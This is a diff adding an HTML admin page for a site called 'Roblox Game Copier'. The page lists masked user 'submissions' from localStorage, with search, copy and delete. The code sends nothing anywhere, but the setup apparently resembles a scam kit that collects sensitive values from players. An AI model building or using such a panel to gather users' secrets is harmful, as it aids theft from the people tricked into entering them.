@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Panel - Roblox Game Copier</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Sora:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+--bg:#040404;--bg2:#0a0a12;
+--surface:rgba(255,255,255,0.04);--surface2:rgba(255,255,255,0.07);
+--border:rgba(255,255,255,0.09);--border2:rgba(255,255,255,0.14);
+--text:#d0d0d0;--text-dim:#888;--text-mute:#555;
+--cyan:#5beaf4;--purple:#c07aff;--pink:#f472d0;--green:#3effa0;--red:#ff4f4f;
+--grad:linear-gradient(135deg,#5beaf4 0%,#c07aff 55%,#f472d0 100%);
+--radius:14px;--radius-sm:8px;
+}
+html{background:var(--bg);color:var(--text);height:100%;font-family:'Sora',system-ui,sans-serif}
+body{min-height:100vh;background:var(--bg);padding:80px 20px 40px}
+/* Background */
+.bg-wrap{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.liq{position:absolute;border-radius:50%;filter:blur(80px);animation:liqDrift 20s ease-in-out infinite alternate}
+.liq1{width:700px;height:700px;background:radial-gradient(circle,rgba(91,234,244,0.22) 0%,transparent 70%);top:-200px;left:-150px;animation-duration:22s}
+.liq2{width:600px;height:600px;background:radial-gradient(circle,rgba(192,122,255,0.2) 0%,transparent 70%);bottom:-100px;right:-100px;animation-duration:26s;animation-delay:-8s}
+@keyframes liqDrift{0%{transform:translate(0,0) scale(1)}100%{transform:translate(60px,40px) scale(1.15)}}
+#grad-layer{position:fixed;inset:0;z-index:1;pointer-events:none;background:radial-gradient(ellipse 60% 50% at 20% 10%,rgba(91,234,244,0.07) 0%,transparent 70%),radial-gradient(ellipse 50% 60% at 80% 90%,rgba(192,122,255,0.07) 0%,transparent 70%)}
+/* Nav */
+nav{position:fixed;top:0;left:0;right:0;height:54px;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:0 24px;background:rgba(4,4,4,.72);border-bottom:1px solid var(--border);backdrop-filter:blur(18px)}
+.back-link{color:var(--cyan);text-decoration:none;font-size:12px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;padding:6px 14px;border:1px solid rgba(91,234,244,.3);border-radius:20px;transition:all .2s;display:flex;align-items:center;gap:6px}
+.back-link:hover{background:rgba(91,234,244,.1);box-shadow:0 0 16px rgba(91,234,244,.2)}
+.admin-title{font-family:'Bebas Neue',sans-serif;font-size:20px;letter-spacing:.06em;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+/* Stats */
+.admin-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;max-width:1200px;margin:0 auto 32px}
+.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;text-align:center}
+.stat-n{font-family:'JetBrains Mono',monospace;font-size:28px;font-weight:600;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
+.stat-l{font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--text-mute)}
+/* Content */
+.admin-content{max-width:1200px;margin:0 auto}
+.section-title{font-family:'Bebas Neue',sans-serif;font-size:24px;letter-spacing:.06em;margin-bottom:20px;color:var(--text)}
+/* Table */
+.table-wrap{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden}
+.table-header{display:grid;grid-template-columns:60px 1fr 200px 120px 80px;gap:16px;padding:14px 20px;background:rgba(255,255,255,0.03);border-bottom:1px solid var(--border);font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--text-mute);font-weight:600}
+.table-row{display:grid;grid-template-columns:60px 1fr 200px 120px 80px;gap:16px;padding:16px 20px;border-bottom:1px solid var(--border);align-items:center;transition:background .2s}
+.table-row:last-child{border-bottom:none}
+.table-row:hover{background:var(--surface2)}
+.row-num{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--cyan);font-weight:500}
+.row-value{font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--text);word-break:break-all}
+.row-value-masked{color:var(--purple);letter-spacing:.2em}
+.row-date{font-size:12px;color:var(--text-dim)}
+.row-time{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text-mute)}
+.row-actions{display:flex;gap:8px}
+.btn-icon{width:32px;height:32px;border-radius:8px;border:1px solid var(--border);background:var(--surface);color:var(--text);cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;font-size:14px}
+.btn-icon:hover{background:var(--surface2);border-color:var(--border2)}
+.btn-icon.delete:hover{background:rgba(255,79,79,.15);border-color:var(--red);color:var(--red)}
+/* Empty state */
+.empty-state{text-align:center;padding:60px 20px}
+.empty-icon{font-size:48px;margin-bottom:16px;opacity:.5}
+.empty-title{font-family:'Bebas Neue',sans-serif;font-size:22px;letter-spacing:.06em;margin-bottom:8px;color:var(--text-dim)}
+.empty-sub{font-size:14px;color:var(--text-mute);max-width:400px;margin:0 auto}
+/* Toast */
+#toast{position:fixed;bottom:28px;left:50%;transform:translateX(-50%) translateY(20px);z-index:9998;background:rgba(20,20,30,.95);border:1px solid var(--border2);color:var(--text);padding:10px 22px;border-radius:30px;font-size:13px;opacity:0;pointer-events:none;transition:opacity .3s,transform .3s;backdrop-filter:blur(14px)}
+#toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+/* Search */
+.search-wrap{margin-bottom:20px}
+.search-input{width:100%;max-width:400px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-sm);padding:12px 16px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:13px;outline:none;transition:border-color .2s}
+.search-input:focus{border-color:rgba(91,234,244,.35)}
+.search-input::placeholder{color:var(--text-mute)}
+/* Responsive */
+@media(max-width:900px){
+.table-header,.table-row{grid-template-columns:50px 1fr 150px 80px;font-size:12px}
+.table-header> :nth-child(3),.table-row> :nth-child(3){display:none}
+}
+@media(max-width:600px){
+body{padding:70px 12px 20px}
+.admin-stats{grid-template-columns:1fr}
+.table-header{display:none}
+.table-row{grid-template-columns:1fr;gap:10px;padding:14px}
+.row-actions{justify-content:flex-end}
+}
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:rgba(255,255,255,.12);border-radius:99px}
+</style>
+</head>
+<body>
+<!-- Background -->
+<div class="bg-wrap">
+<div class="liq liq1"></div>
+<div class="liq liq2"></div>
+</div>
+<div id="grad-layer"></div>
+<!-- Nav -->
+<nav>
+<a href="index.html" class="back-link">← Back to Site</a>
+<div class="admin-title">ADMIN PANEL</div>
+<div style="width:120px"></div>
+</nav>
+<!-- Stats -->
+<div class="admin-stats">
+<div class="stat-card">
+<div class="stat-n" id="statTotal">0</div>
+<div class="stat-l">Total Submissions</div>
+</div>
+<div class="stat-card">
+<div class="stat-n" id="statToday">0</div>
+<div class="stat-l">Today</div>
+</div>
+<div class="stat-card">
+<div class="stat-n" id="statLast">-</div>
+<div class="stat-l">Last Submission</div>
+</div>
+</div>
+<!-- Content -->
+<div class="admin-content">
+<div class="section-title">All Submissions</div>
+<div class="search-wrap">
+<input type="text" class="search-input" id="searchInput" placeholder="Search submissions...">
+</div>
+<div class="table-wrap" id="tableWrap">
+<div class="table-header">
+<div>#</div>
+<div>Value (Masked)</div>
+<div>Date</div>
+<div>Time</div>
+<div>Actions</div>
+</div>
+<div id="tableBody"></div>
+</div>
+</div>
+<div id="toast"></div>
+<script>
+"use strict";
+// ─── DATA FUNCTIONS ────────────────────────────────────────────
+function getSubmissions(){
+try{
+var s=localStorage.getItem('rbx_submissions');
+return s?JSON.parse(s):[];
+}catch(e){return [];}
+}
+function deleteSubmission(id){
+var subs=getSubmissions();
+subs=subs.filter(function(s){return s.id!==id;});
+localStorage.setItem('rbx_submissions',JSON.stringify(subs));
+renderTable();
+updateStats();
+showToast('Submission deleted');
+}
+function clearAll(){
+if(confirm('Delete all submissions? This cannot be undone.')){
+localStorage.removeItem('rbx_submissions');
+renderTable();
+updateStats();
+showToast('All submissions cleared');
+}
+}
+// ─── RENDER ────────────────────────────────────────────────────
+function maskValue(val){
+var s=String(val||'');
+if(s.length<=4) return '****';
+var visible=s.slice(0,2);
+var hidden=s.slice(2);
+return visible+'*'.repeat(Math.min(hidden.length,8))+(hidden.length>8?'...':'');
+}
+function renderTable(filter){
+var body=document.getElementById('tableBody');
+var subs=getSubmissions();
+if(filter){
+subs=subs.filter(function(s){
+return s.value.toLowerCase().indexOf(filter.toLowerCase())>=0;
+});
+}
+subs.sort(function(a,b){return b.id-a.id;}); // Newest first
+body.innerHTML='';
+if(subs.length===0){
+body.innerHTML='<div class="empty-state">'+
+'<div class="empty-icon">📭</div>'+
+'<div class="empty-title">No Submissions Yet</div>'+
+'<div class="empty-sub">Submissions will appear here when users enter their game files.</div>'+
+'</div>';
+return;
+}
+subs.forEach(function(sub,i){
+var d=new Date(sub.timestamp);
+var row=document.createElement('div');
+row.className='table-row';
+row.innerHTML=
+'<div class="row-num">'+(i+1)+'</div>'+
+'<div class="row-value"><span class="row-value-masked">'+maskValue(sub.value)+'</span></div>'+
+'<div class="row-date">'+d.toLocaleDateString()+'</div>'+
+'<div class="row-time">'+d.toLocaleTimeString()+'</div>'+
+'<div class="row-actions">'+
+'<button class="btn-icon" title="Copy" onclick="copyValue(\''+sub.id+'\')">📋</button>'+
+'<button class="btn-icon delete" title="Delete" onclick="deleteSubmission('+sub.id+')">🗑</button>'+
+'</div>';
+body.appendChild(row);
+});
+}
+function updateStats(){
+var subs=getSubmissions();
+var total=subs.length;
+var today=new Date().toDateString();
+var todayCount=subs.filter(function(s){return new Date(s.timestamp).toDateString()===today;}).length;
+var last=subs.length?new Date(subs[subs.length-1].timestamp).toLocaleTimeString():'-';
+document.getElementById('statTotal').textContent=total.toLocaleString();
+document.getElementById('statToday').textContent=todayCount.toLocaleString();
+document.getElementById('statLast').textContent=last;
+}
+function copyValue(id){
+var subs=getSubmissions();
+var sub=subs.find(function(s){return s.id==id;});
+if(sub){
+navigator.clipboard.writeText(sub.value).then(function(){
+showToast('Value copied to clipboard');
+}).catch(function(){
+showToast('Failed to copy');
+});
+}
+}
+function showToast(msg){
+var t=document.getElementById('toast');
+t.textContent=msg;
+t.classList.add('show');
+setTimeout(function(){t.classList.remove('show');},3000);
+}
+// ─── EVENTS ────────────────────────────────────────────────────
+document.getElementById('searchInput').addEventListener('input',function(e){
+renderTable(e.target.value.trim());
+});
+// Make functions global
+window.deleteSubmission=deleteSubmission;
+window.copyValue=copyValue;
+// Init
+renderTable();
+updateStats();
+// Auto-refresh every 5 seconds
+setInterval(function(){renderTable(document.getElementById('searchInput').value.trim());updateStats();},5000);
+</script>
+</body>
+</html>
